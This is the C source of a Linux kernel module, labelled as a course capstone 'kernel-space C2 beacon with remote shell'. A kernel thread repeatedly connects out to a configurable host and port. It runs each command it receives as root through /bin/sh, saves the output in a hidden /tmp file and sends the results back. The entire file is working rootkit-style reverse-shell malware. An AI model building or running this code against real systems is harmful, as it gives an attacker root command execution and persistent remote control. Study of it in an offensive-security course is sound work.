// SPDX-License-Identifier: GPL-2.0
#include <linux/delay.h>
#include <linux/errno.h>
#include <linux/fs.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/init.h>
#include <linux/kthread.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/net.h>
#include <linux/printk.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/slab.h>
#include <linux/umh.h>

static char *target = "127.0.0.1";
module_param(target, charp, 0444);
static int port = 4444;
module_param(port, int, 0444);
static int interval = 5;
module_param(interval, int, 0644);

static struct task_struct *beacon;
static struct proc_dir_entry *proc_entry;
static unsigned long connections;
static unsigned long commands;
static struct socket *active_sock;
static bool stopping;

static int send_all(struct socket *sock, const char *buf, int len)
{
	struct kvec vec = { .iov_base = (void *)buf, .iov_len = len };
	struct msghdr msg = { 0 };

	return kernel_sendmsg(sock, &msg, &vec, 1, len);
}

static int recv_line(struct socket *sock, char *buf, int maxlen)
{
	struct kvec vec;
	struct msghdr msg = { 0 };
	int total = 0, ret;

	while (total < maxlen - 1) {
		vec.iov_base = buf + total;
		vec.iov_len = 1;
		ret = kernel_recvmsg(sock, &msg, &vec, 1, 1, 0);
		if (ret <= 0)
			return ret;
		if (buf[total] == '\n') {
			buf[total] = '\0';
			return total;
		}
		total++;
	}
	buf[total] = '\0';
	return total;
}

static int exec_cmd(const char *cmd, char *out, int outlen)
{
	char cmdline[320];
	char *argv[] = { "/bin/sh", "-c", cmdline, NULL };
	char *envp[] = { "PATH=/bin:/sbin:/usr/bin", NULL };
	struct file *f;
	loff_t pos = 0;
	int ret;

	snprintf(cmdline, sizeof(cmdline), "%s > /tmp/.rk_out 2>&1", cmd);
	ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);

	f = filp_open("/tmp/.rk_out", O_RDONLY, 0);
	if (IS_ERR(f)) {
		snprintf(out, outlen, "(exec error %d)\n", ret);
		return strlen(out);
	}
	ret = kernel_read(f, out, outlen - 1, &pos);
	filp_close(f, NULL);
	if (ret < 0)
		ret = 0;
	out[ret] = '\0';
	return ret;
}

static int handle_session(struct socket *sock)
{
	char cmd[256];
	char *output;
	int len, outlen;

	output = kmalloc(4096, GFP_KERNEL);
	if (!output)
		return -ENOMEM;

	while (!kthread_should_stop() && !stopping) {
		len = recv_line(sock, cmd, sizeof(cmd));
		if (len <= 0)
			break;
		if (strcmp(cmd, "exit") == 0)
			break;

		commands++;
		outlen = exec_cmd(cmd, output, 4096);
		if (outlen > 0)
			send_all(sock, output, outlen);
		else
			send_all(sock, "(no output)\n", 12);
	}

	kfree(output);
	return 0;
}

static int beacon_fn(void *data)
{
	struct socket *sock;
	struct sockaddr_in addr;
	int err;

	while (!kthread_should_stop() && !stopping) {
		err = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
		if (err) {
			ssleep(interval);
			continue;
		}

		memset(&addr, 0, sizeof(addr));
		addr.sin_family = AF_INET;
		addr.sin_port = htons(port);
		addr.sin_addr.s_addr = in_aton(target);

		err = kernel_connect(sock, (struct sockaddr_unsized *)&addr,
				     sizeof(addr), 0);
		if (err) {
			sock_release(sock);
			if (!stopping)
				ssleep(interval);
			continue;
		}

		active_sock = sock;
		connections++;
		pr_info("rk: beacon connected to %s:%d\n", target, port);
		handle_session(sock);
		active_sock = NULL;
		sock_release(sock);

		if (!kthread_should_stop() && !stopping)
			ssleep(interval);
	}
	return 0;
}

static int shell_read(struct seq_file *m, void *v)
{
	seq_printf(m, "target=%s\nport=%d\ninterval=%d\n"
			   "connections=%lu\ncommands=%lu\n",
		   target, port, interval, connections, commands);
	return 0;
}


static int __init shell_init(void)
{
	proc_entry = proc_create_single("rk_shell", 0444, NULL, shell_read);
	if (!proc_entry)
		return -ENOMEM;

	beacon = kthread_run(beacon_fn, NULL, "rk_beacon");
	if (IS_ERR(beacon)) {
		proc_remove(proc_entry);
		return PTR_ERR(beacon);
	}

	pr_info("rk: remote shell beacon started -> %s:%d\n", target, port);
	return 0;
}

static void __exit shell_exit(void)
{
	stopping = true;
	if (active_sock)
		kernel_sock_shutdown(active_sock, SHUT_RDWR);
	kthread_stop(beacon);
	proc_remove(proc_entry);
	pr_info("rk: remote shell beacon stopped\n");
}

module_init(shell_init);
module_exit(shell_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Capstone 4: kernel-space C2 beacon with remote shell");
